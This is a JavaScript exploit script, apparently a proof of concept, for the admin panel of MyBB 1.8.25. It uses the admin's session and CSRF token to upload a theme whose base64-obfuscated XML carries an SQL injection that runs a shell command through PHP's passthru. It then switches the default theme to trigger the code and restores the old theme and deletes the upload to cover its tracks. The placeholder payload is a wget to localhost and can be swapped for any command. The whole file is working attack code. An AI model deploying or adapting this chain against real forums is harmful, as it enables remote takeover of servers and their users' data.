// namespace to hold all things related to the exploit
window.x = {};

// important to encode more complex payloads as this just gets interposed into the xml
// the two single quotes are important
window.x.payload = "'wget localhost/successful_execution'";
// name of the theme to upload
window.x.theme_name = "new_theme_test";

// get prefix of the mybb tables, this is mybb_ per default, but might be different
fetch('/mybb1825/admin/index.php?module=tools-optimizedb').then(function a(response) {
  return response.text();
}).then(function b(body) {
  window.x.body = body;
  window.x.prefix = body.match('value="(.*_)adminlog"')[1];

// check if we found the prefix, might as well just set the prefix to mybb_ in this case
if(!window.x.prefix) { alert('could not find prefix')}
// check for post_key
if(!my_post_key) { alert('could not find my_post_key')}

// upload template
window.x.template = atob("PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz48dGhlbWUgbmFtZT0iRGVmYXVsdCIgdmVyc2lvbj0iMTgyMSI+ICAgICAgICA8cHJvcGVydGllcz4gICAgPHRlbXBsYXRlc2V0PicpIEFORCAxPTAgVU5JT04gU0VMRUNUIHRpdGxlLCAnJHtwYXNzdGhydSgn") + window.x.payload + atob("Jyl9JyBmcm9tIA==") + window.x.prefix + atob("dGVtcGxhdGVzIC0tIDwvdGVtcGxhdGVzZXQ+ICAgICAgICA8L3Byb3BlcnRpZXM+PC90aGVtZT4=");

window.x.formdata = new FormData();

window.x.blob = new Blob([window.x.template], {type : "text/xml"});

window.x.formdata.append("local_file", window.x.blob);
window.x.formdata.append("my_post_key", my_post_key);
window.x.formdata.append("name", window.x.theme_name);
window.x.formdata.append("tid", "1");
window.x.formdata.append("import_stylesheets", "0");
window.x.formdata.append("import_templates", "1");
window.x.formdata.append("import", "0");

window.x.request = new XMLHttpRequest();
window.x.request.open("POST", "/mybb1825/admin/index.php?module=style-themes&action=import");
window.x.request.onreadystatechange = function() {
    fetch_id_and_change();

}
window.x.request.send(window.x.formdata);


})

// get current theme, switch themes, trigger php code execution, restore default theme and delete uploaded theme
function fetch_id_and_change() {
    fetch("/mybb1825/admin/index.php?module=style").then(function a(resp) {
        return resp.text();
    }).then(function b(body) {
        window.x.current_theme = body.match(/Default Theme\" \/><\/div><div .*;tid=(\d+)\">/)[1];
        window.x.theme_id = body.match('tid=(\\d+)">' + window.x.theme_name)[1];
        fetch("/mybb1825/admin/index.php?module=style-themes&action=set_default&tid=" + window.x.theme_id + "&my_post_key=" + my_post_key).then(function a() {
            // trigger rce
            fetch("/").then(() => {
                fetch("/mybb1825/admin/index.php?module=style-themes&action=set_default&tid=" + window.x.current_theme + "&my_post_key=" + my_post_key)
            }).then(() => {
                fetch("/mybb1825/admin/index.php?module=style-themes&action=delete&tid=" + window.x.theme_id + "&my_post_key=" + my_post_key, {method: 'POST'});
            });
        });
    })
}

